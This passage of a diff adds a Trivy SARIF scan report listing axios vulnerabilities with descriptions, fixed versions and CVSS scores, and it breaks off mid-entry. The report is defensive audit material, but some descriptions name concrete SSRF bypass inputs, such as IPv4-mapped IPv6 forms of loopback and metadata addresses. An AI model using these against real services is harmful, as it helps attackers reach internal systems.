@@ -1,0 +1,1790 @@
+{
+  "version": "2.1.0",
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "fullName": "Trivy Vulnerability Scanner",
+          "informationUri": "https://github.com/aquasecurity/trivy",
+          "name": "Trivy",
+          "rules": [
+            {
+              "id": "CVE-2021-3749",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "nodejs-axios: Regular expression denial of service in trim function"
+              },
+              "fullDescription": {
+                "text": "axios is vulnerable to Inefficient Regular Expression Complexity"
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2021-3749",
+              "help": {
+                "text": "Vulnerability CVE-2021-3749\nSeverity: HIGH\nPackage: axios\nFixed Version: 0.21.2\nLink: [CVE-2021-3749](https://avd.aquasec.com/nvd/cve-2021-3749)\naxios is vulnerable to Inefficient Regular Expression Complexity",
+                "markdown": "**Vulnerability CVE-2021-3749**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|axios|0.21.2|[CVE-2021-3749](https://avd.aquasec.com/nvd/cve-2021-3749)|\n\naxios is vulnerable to Inefficient Regular Expression Complexity"
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.5,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-27152",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Possible SSRF and Credential Leakage via Absolute URL in axios Requests"
+              },
+              "fullDescription": {
+                "text": "axios is a promise based HTTP client for the browser and node.js. The issue occurs when passing absolute URLs rather than protocol-relative URLs to axios. Even if ⁠baseURL is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios. This issue is fixed in 1.8.2."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2025-27152",
+              "help": {
+                "text": "Vulnerability CVE-2025-27152\nSeverity: HIGH\nPackage: axios\nFixed Version: 1.8.2, 0.30.0\nLink: [CVE-2025-27152](https://avd.aquasec.com/nvd/cve-2025-27152)\naxios is a promise based HTTP client for the browser and node.js. The issue occurs when passing absolute URLs rather than protocol-relative URLs to axios. Even if ⁠baseURL is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios. This issue is fixed in 1.8.2.",
+                "markdown": "**Vulnerability CVE-2025-27152**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|axios|1.8.2, 0.30.0|[CVE-2025-27152](https://avd.aquasec.com/nvd/cve-2025-27152)|\n\naxios is a promise based HTTP client for the browser and node.js. The issue occurs when passing absolute URLs rather than protocol-relative URLs to axios. Even if ⁠baseURL is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios. This issue is fixed in 1.8.2."
+              },
+              "properties": {
+                "cvssv40_baseScore": 7.7,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:P",
+                "precision": "very-high",
+                "security-severity": "8.0",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-25639",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios affected by Denial of Service via __proto__ Key in mergeConfig"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Prior to versions 0.30.3 and 1.13.5, the mergeConfig function in axios crashes with a TypeError when processing configuration objects containing __proto__ as an own property. An attacker can trigger this by providing a malicious configuration object created via JSON.parse(), causing complete denial of service. This vulnerability is fixed in versions 0.30.3 and 1.13.5."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-25639",
+              "help": {
+                "text": "Vulnerability CVE-2026-25639\nSeverity: HIGH\nPackage: axios\nFixed Version: 1.13.5, 0.30.3\nLink: [CVE-2026-25639](https://avd.aquasec.com/nvd/cve-2026-25639)\nAxios is a promise based HTTP client for the browser and Node.js. Prior to versions 0.30.3 and 1.13.5, the mergeConfig function in axios crashes with a TypeError when processing configuration objects containing __proto__ as an own property. An attacker can trigger this by providing a malicious configuration object created via JSON.parse(), causing complete denial of service. This vulnerability is fixed in versions 0.30.3 and 1.13.5.",
+                "markdown": "**Vulnerability CVE-2026-25639**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|axios|1.13.5, 0.30.3|[CVE-2026-25639](https://avd.aquasec.com/nvd/cve-2026-25639)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Prior to versions 0.30.3 and 1.13.5, the mergeConfig function in axios crashes with a TypeError when processing configuration objects containing __proto__ as an own property. An attacker can trigger this by providing a malicious configuration object created via JSON.parse(), causing complete denial of service. This vulnerability is fixed in versions 0.30.3 and 1.13.5."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.5,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-42033",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios: HTTP Transport Hijacking via Prototype Pollution"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, when Object.prototype has been polluted by any co-dependency with keys that axios reads without a hasOwnProperty guard, an attacker can (a) silently intercept and modify every JSON response before the application sees it, or (b) fully hijack the underlying HTTP transport, gaining access to request credentials, headers, and body. The precondition is prototype pollution from a separate source in the same process. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-42033",
+              "help": {
+                "text": "Vulnerability CVE-2026-42033\nSeverity: HIGH\nPackage: axios\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42033](https://avd.aquasec.com/nvd/cve-2026-42033)\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, when Object.prototype has been polluted by any co-dependency with keys that axios reads without a hasOwnProperty guard, an attacker can (a) silently intercept and modify every JSON response before the application sees it, or (b) fully hijack the underlying HTTP transport, gaining access to request credentials, headers, and body. The precondition is prototype pollution from a separate source in the same process. This vulnerability is fixed in 1.15.1 and 0.31.1.",
+                "markdown": "**Vulnerability CVE-2026-42033**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|axios|1.15.1, 0.31.1|[CVE-2026-42033](https://avd.aquasec.com/nvd/cve-2026-42033)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, when Object.prototype has been polluted by any co-dependency with keys that axios reads without a hasOwnProperty guard, an attacker can (a) silently intercept and modify every JSON response before the application sees it, or (b) fully hijack the underlying HTTP transport, gaining access to request credentials, headers, and body. The precondition is prototype pollution from a separate source in the same process. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.4,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+                "precision": "very-high",
+                "security-severity": "7.4",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-42035",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios: Arbitrary HTTP header injection via prototype pollution"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, a prototype pollution gadget exists in the Axios HTTP adapter (lib/adapters/http.js) that allows an attacker to inject arbitrary HTTP headers into outgoing requests. The vulnerability exploits duck-type checking of the data payload, where if Object.prototype is polluted with getHeaders, append, pipe, on, once, and Symbol.toStringTag, Axios misidentifies any plain object payload as a FormData instance and calls the attacker-controlled getHeaders() function, merging the returned headers into the outgoing request. The vulnerable code resides exclusively in lib/adapters/http.js. The prototype pollution source does not need to originate from Axios itself — any prototype pollution primitive in any dependency in the application's dependency tree is sufficient to trigger this gadget. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-42035",
+              "help": {
+                "text": "Vulnerability CVE-2026-42035\nSeverity: HIGH\nPackage: axios\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42035](https://avd.aquasec.com/nvd/cve-2026-42035)\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, a prototype pollution gadget exists in the Axios HTTP adapter (lib/adapters/http.js) that allows an attacker to inject arbitrary HTTP headers into outgoing requests. The vulnerability exploits duck-type checking of the data payload, where if Object.prototype is polluted with getHeaders, append, pipe, on, once, and Symbol.toStringTag, Axios misidentifies any plain object payload as a FormData instance and calls the attacker-controlled getHeaders() function, merging the returned headers into the outgoing request. The vulnerable code resides exclusively in lib/adapters/http.js. The prototype pollution source does not need to originate from Axios itself — any prototype pollution primitive in any dependency in the application's dependency tree is sufficient to trigger this gadget. This vulnerability is fixed in 1.15.1 and 0.31.1.",
+                "markdown": "**Vulnerability CVE-2026-42035**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|axios|1.15.1, 0.31.1|[CVE-2026-42035](https://avd.aquasec.com/nvd/cve-2026-42035)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, a prototype pollution gadget exists in the Axios HTTP adapter (lib/adapters/http.js) that allows an attacker to inject arbitrary HTTP headers into outgoing requests. The vulnerability exploits duck-type checking of the data payload, where if Object.prototype is polluted with getHeaders, append, pipe, on, once, and Symbol.toStringTag, Axios misidentifies any plain object payload as a FormData instance and calls the attacker-controlled getHeaders() function, merging the returned headers into the outgoing request. The vulnerable code resides exclusively in lib/adapters/http.js. The prototype pollution source does not need to originate from Axios itself — any prototype pollution primitive in any dependency in the application's dependency tree is sufficient to trigger this gadget. This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.4,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+                "precision": "very-high",
+                "security-severity": "7.4",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-42043",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios: NO_PROXY bypass via crafted URL"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, an attacker who can influence the target URL of an Axios request can use any address in the 127.0.0.0/8 range (other than 127.0.0.1) to completely bypass the NO_PROXY protection. This vulnerability is due to an incomplete for CVE-2025-62718, This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-42043",
+              "help": {
+                "text": "Vulnerability CVE-2026-42043\nSeverity: HIGH\nPackage: axios\nFixed Version: 1.15.1, 0.31.1\nLink: [CVE-2026-42043](https://avd.aquasec.com/nvd/cve-2026-42043)\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, an attacker who can influence the target URL of an Axios request can use any address in the 127.0.0.0/8 range (other than 127.0.0.1) to completely bypass the NO_PROXY protection. This vulnerability is due to an incomplete for CVE-2025-62718, This vulnerability is fixed in 1.15.1 and 0.31.1.",
+                "markdown": "**Vulnerability CVE-2026-42043**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|axios|1.15.1, 0.31.1|[CVE-2026-42043](https://avd.aquasec.com/nvd/cve-2026-42043)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.1 and 0.31.1, an attacker who can influence the target URL of an Axios request can use any address in the 127.0.0.0/8 range (other than 127.0.0.1) to completely bypass the NO_PROXY protection. This vulnerability is due to an incomplete for CVE-2025-62718, This vulnerability is fixed in 1.15.1 and 0.31.1."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.2,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+                "precision": "very-high",
+                "security-severity": "7.2",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-44486",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios: Information disclosure of proxy credentials via HTTP redirects"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 0.32.0 and 1.16.0, Axios’ Node.js HTTP adapter can leak proxy credentials to a redirect target in affected versions. When a request is sent through an authenticated proxy, Axios may add a Proxy-Authorization header. If Axios then follows a redirect and the redirected request is no longer sent through that proxy, the stale Proxy-Authorization header can remain on the redirected request and be sent to the redirect target. This affects Node.js's use of Axios with automatic redirects enabled and an authenticated proxy configuration. Browser adapters are not affected. This vulnerability is fixed in 0.32.0 and 1.16.0."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-44486",
+              "help": {
+                "text": "Vulnerability CVE-2026-44486\nSeverity: HIGH\nPackage: axios\nFixed Version: 1.16.0, 0.32.0\nLink: [CVE-2026-44486](https://avd.aquasec.com/nvd/cve-2026-44486)\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 0.32.0 and 1.16.0, Axios’ Node.js HTTP adapter can leak proxy credentials to a redirect target in affected versions. When a request is sent through an authenticated proxy, Axios may add a Proxy-Authorization header. If Axios then follows a redirect and the redirected request is no longer sent through that proxy, the stale Proxy-Authorization header can remain on the redirected request and be sent to the redirect target. This affects Node.js's use of Axios with automatic redirects enabled and an authenticated proxy configuration. Browser adapters are not affected. This vulnerability is fixed in 0.32.0 and 1.16.0.",
+                "markdown": "**Vulnerability CVE-2026-44486**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|axios|1.16.0, 0.32.0|[CVE-2026-44486](https://avd.aquasec.com/nvd/cve-2026-44486)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 0.32.0 and 1.16.0, Axios’ Node.js HTTP adapter can leak proxy credentials to a redirect target in affected versions. When a request is sent through an authenticated proxy, Axios may add a Proxy-Authorization header. If Axios then follows a redirect and the redirected request is no longer sent through that proxy, the stale Proxy-Authorization header can remain on the redirected request and be sent to the redirect target. This affects Node.js's use of Axios with automatic redirects enabled and an authenticated proxy configuration. Browser adapters are not affected. This vulnerability is fixed in 0.32.0 and 1.16.0."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.5,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-44487",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios: Information disclosure of proxy credentials via redirect flows"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 0.32.0 and 1.16.0, Axios’s Node.js HTTP adapter may forward a Proxy-Authorization header to a redirected origin during specific proxy-to-direct redirect flows. This affects Node.js usage, where an initial HTTP request is sent through an authenticated HTTP proxy, redirects are followed, and the redirected URL is no longer proxied. Under affected redirect shapes, the final origin can receive the proxy credential that was intended only for the outbound proxy. This vulnerability is fixed in 0.32.0 and 1.16.0."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-44487",
+              "help": {
+                "text": "Vulnerability CVE-2026-44487\nSeverity: HIGH\nPackage: axios\nFixed Version: 1.16.0, 0.32.0\nLink: [CVE-2026-44487](https://avd.aquasec.com/nvd/cve-2026-44487)\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 0.32.0 and 1.16.0, Axios’s Node.js HTTP adapter may forward a Proxy-Authorization header to a redirected origin during specific proxy-to-direct redirect flows. This affects Node.js usage, where an initial HTTP request is sent through an authenticated HTTP proxy, redirects are followed, and the redirected URL is no longer proxied. Under affected redirect shapes, the final origin can receive the proxy credential that was intended only for the outbound proxy. This vulnerability is fixed in 0.32.0 and 1.16.0.",
+                "markdown": "**Vulnerability CVE-2026-44487**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|axios|1.16.0, 0.32.0|[CVE-2026-44487](https://avd.aquasec.com/nvd/cve-2026-44487)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 0.32.0 and 1.16.0, Axios’s Node.js HTTP adapter may forward a Proxy-Authorization header to a redirected origin during specific proxy-to-direct redirect flows. This affects Node.js usage, where an initial HTTP request is sent through an authenticated HTTP proxy, redirects are followed, and the redirected URL is no longer proxied. Under affected redirect shapes, the final origin can receive the proxy credential that was intended only for the outbound proxy. This vulnerability is fixed in 0.32.0 and 1.16.0."
+              },
+              "properties": {
+                "cvssv40_baseScore": 8.2,
+                "cvssv40_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+                "precision": "very-high",
+                "security-severity": "8.0",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-44492",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios: Proxy bypass via IPv4-mapped IPv6 address non-normalization"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Prior to 0.32.0 and 1.16.0, Axios does not normalise IPv4-mapped IPv6 addresses. When NO_PROXY lists an IPv4 address such as 127.0.0.1 or 169.254.169.254, a request URL using the IPv4-mapped IPv6 form (::ffff:7f00:1, ::ffff:a9fe:a9fe) still routes through the configured proxy. Node.js resolves these addresses to the underlying IPv4 host, so the request reaches the internal service via the proxy rather than being blocked. This vulnerability is fixed in 0.32.0 and 1.16.0."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-44492",
+              "help": {
+                "text": "Vulnerability CVE-2026-44492\nSeverity: HIGH\nPackage: axios\nFixed Version: 1.16.0, 0.32.0\nLink: [CVE-2026-44492](https://avd.aquasec.com/nvd/cve-2026-44492)\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 0.32.0 and 1.16.0, Axios does not normalise IPv4-mapped IPv6 addresses. When NO_PROXY lists an IPv4 address such as 127.0.0.1 or 169.254.169.254, a request URL using the IPv4-mapped IPv6 form (::ffff:7f00:1, ::ffff:a9fe:a9fe) still routes through the configured proxy. Node.js resolves these addresses to the underlying IPv4 host, so the request reaches the internal service via the proxy rather than being blocked. This vulnerability is fixed in 0.32.0 and 1.16.0.",
+                "markdown": "**Vulnerability CVE-2026-44492**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|axios|1.16.0, 0.32.0|[CVE-2026-44492](https://avd.aquasec.com/nvd/cve-2026-44492)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Prior to 0.32.0 and 1.16.0, Axios does not normalise IPv4-mapped IPv6 addresses. When NO_PROXY lists an IPv4 address such as 127.0.0.1 or 169.254.169.254, a request URL using the IPv4-mapped IPv6 form (::ffff:7f00:1, ::ffff:a9fe:a9fe) still routes through the configured proxy. Node.js resolves these addresses to the underlying IPv4 host, so the request reaches the internal service via the proxy rather than being blocked. This vulnerability is fixed in 0.32.0 and 1.16.0."
+              },
+              "properties": {
+                "cvssv3_baseScore": 8.6,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+                "precision": "very-high",
+                "security-severity": "8.6",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-44495",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios: Information disclosure due to prototype pollution vulnerability"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. From 0.19.0 to before 0.31.1 and 1.15.2, Axios contains prototype-pollution gadgets in request config processing. If another vulnerability in the same JavaScript process has already polluted Object.prototype.transformResponse, affected Axios versions may treat that inherited value as request configuration or as an option validator. Axios does not itself create the prototype pollution. Exploitability requires a separate prototype-pollution vulnerability or equivalent attacker control over Object.prototype before Axios creates a request. This vulnerability is fixed in 0.31.1 and 1.15.2."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-44495",
+              "help": {
+                "text": "Vulnerability CVE-2026-44495\nSeverity: HIGH\nPackage: axios\nFixed Version: 1.15.2, 0.31.1\nLink: [CVE-2026-44495](https://avd.aquasec.com/nvd/cve-2026-44495)\nAxios is a promise based HTTP client for the browser and Node.js. From 0.19.0 to before 0.31.1 and 1.15.2, Axios contains prototype-pollution gadgets in request config processing. If another vulnerability in the same JavaScript process has already polluted Object.prototype.transformResponse, affected Axios versions may treat that inherited value as request configuration or as an option validator. Axios does not itself create the prototype pollution. Exploitability requires a separate prototype-pollution vulnerability or equivalent attacker control over Object.prototype before Axios creates a request. This vulnerability is fixed in 0.31.1 and 1.15.2.",
+                "markdown": "**Vulnerability CVE-2026-44495**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|axios|1.15.2, 0.31.1|[CVE-2026-44495](https://avd.aquasec.com/nvd/cve-2026-44495)|\n\nAxios is a promise based HTTP client for the browser and Node.js. From 0.19.0 to before 0.31.1 and 1.15.2, Axios contains prototype-pollution gadgets in request config processing. If another vulnerability in the same JavaScript process has already polluted Object.prototype.transformResponse, affected Axios versions may treat that inherited value as request configuration or as an option validator. Axios does not itself create the prototype pollution. Exploitability requires a separate prototype-pollution vulnerability or equivalent attacker control over Object.prototype before Axios creates a request. This vulnerability is fixed in 0.31.1 and 1.15.2."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:L",
+                "precision": "very-high",
+                "security-severity": "7.0",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-44496",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios: Client-side Denial of Service via unescaped regex metacharacters in XSRF cookie name"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Axios versions before 0.32.0 on the 0.x line and before 1.16.0 on the 1.x line build a regular expression from the configured XSRF cookie name without escaping regex metacharacters. In standard browser environments, an attacker who can influence the cookie name passed to axios can cause expensive regex backtracking while axios reads document.cookie. The practical impact is client-side availability degradation, such as freezing the affected browser tab while axios prepares a request. The issue does not affect ordinary Node.js HTTP adapter usage, React Native, or web workers, where axios does not read document.cookie. This vulnerability is fixed in 0.32.0 and 1.16.0."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-44496",
+              "help": {
+                "text": "Vulnerability CVE-2026-44496\nSeverity: HIGH\nPackage: axios\nFixed Version: 1.16.0, 0.32.0\nLink: [CVE-2026-44496](https://avd.aquasec.com/nvd/cve-2026-44496)\nAxios is a promise based HTTP client for the browser and Node.js. Axios versions before 0.32.0 on the 0.x line and before 1.16.0 on the 1.x line build a regular expression from the configured XSRF cookie name without escaping regex metacharacters. In standard browser environments, an attacker who can influence the cookie name passed to axios can cause expensive regex backtracking while axios reads document.cookie. The practical impact is client-side availability degradation, such as freezing the affected browser tab while axios prepares a request. The issue does not affect ordinary Node.js HTTP adapter usage, React Native, or web workers, where axios does not read document.cookie. This vulnerability is fixed in 0.32.0 and 1.16.0.",
+                "markdown": "**Vulnerability CVE-2026-44496**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|axios|1.16.0, 0.32.0|[CVE-2026-44496](https://avd.aquasec.com/nvd/cve-2026-44496)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Axios versions before 0.32.0 on the 0.x line and before 1.16.0 on the 1.x line build a regular expression from the configured XSRF cookie name without escaping regex metacharacters. In standard browser environments, an attacker who can influence the cookie name passed to axios can cause expensive regex backtracking while axios reads document.cookie. The practical impact is client-side availability degradation, such as freezing the affected browser tab while axios prepares a request. The issue does not affect ordinary Node.js HTTP adapter usage, React Native, or web workers, where axios does not read document.cookie. This vulnerability is fixed in 0.32.0 and 1.16.0."
+              },
+              "properties": {
+                "cvssv3_baseScore": 7.5,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2020-28168",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "nodejs-axios: allows an attacker to bypass a proxy by providing a URL that responds with a redirect to a restricted host or IP address"
+              },
+              "fullDescription": {
+                "text": "Axios NPM package 0.21.0 contains a Server-Side Request Forgery (SSRF) vulnerability where an attacker is able to bypass a proxy by providing a URL that responds with a redirect to a restricted host or IP address."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2020-28168",
+              "help": {
+                "text": "Vulnerability CVE-2020-28168\nSeverity: MEDIUM\nPackage: axios\nFixed Version: 0.21.1\nLink: [CVE-2020-28168](https://avd.aquasec.com/nvd/cve-2020-28168)\nAxios NPM package 0.21.0 contains a Server-Side Request Forgery (SSRF) vulnerability where an attacker is able to bypass a proxy by providing a URL that responds with a redirect to a restricted host or IP address.",
+                "markdown": "**Vulnerability CVE-2020-28168**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|axios|0.21.1|[CVE-2020-28168](https://avd.aquasec.com/nvd/cve-2020-28168)|\n\nAxios NPM package 0.21.0 contains a Server-Side Request Forgery (SSRF) vulnerability where an attacker is able to bypass a proxy by providing a URL that responds with a redirect to a restricted host or IP address."
+              },
+              "properties": {
+                "cvssv3_baseScore": 5.9,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                "precision": "very-high",
+                "security-severity": "5.9",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2023-45857",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: exposure of confidential data stored in cookies"
+              },
+              "fullDescription": {
+                "text": "An issue discovered in Axios 1.5.1 inadvertently reveals the confidential XSRF-TOKEN stored in cookies by including it in the HTTP header X-XSRF-TOKEN for every request made to any host allowing attackers to view sensitive information."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2023-45857",
+              "help": {
+                "text": "Vulnerability CVE-2023-45857\nSeverity: MEDIUM\nPackage: axios\nFixed Version: 1.6.0, 0.28.0\nLink: [CVE-2023-45857](https://avd.aquasec.com/nvd/cve-2023-45857)\nAn issue discovered in Axios 1.5.1 inadvertently reveals the confidential XSRF-TOKEN stored in cookies by including it in the HTTP header X-XSRF-TOKEN for every request made to any host allowing attackers to view sensitive information.",
+                "markdown": "**Vulnerability CVE-2023-45857**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|axios|1.6.0, 0.28.0|[CVE-2023-45857](https://avd.aquasec.com/nvd/cve-2023-45857)|\n\nAn issue discovered in Axios 1.5.1 inadvertently reveals the confidential XSRF-TOKEN stored in cookies by including it in the HTTP header X-XSRF-TOKEN for every request made to any host allowing attackers to view sensitive information."
+              },
+              "properties": {
+                "cvssv3_baseScore": 6.5,
+                "cvssv3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+                "precision": "very-high",
+                "security-severity": "6.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2025-62718",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios: Server-Side Request Forgery and proxy bypass due to improper hostname normalization"
+              },
+              "fullDescription": {
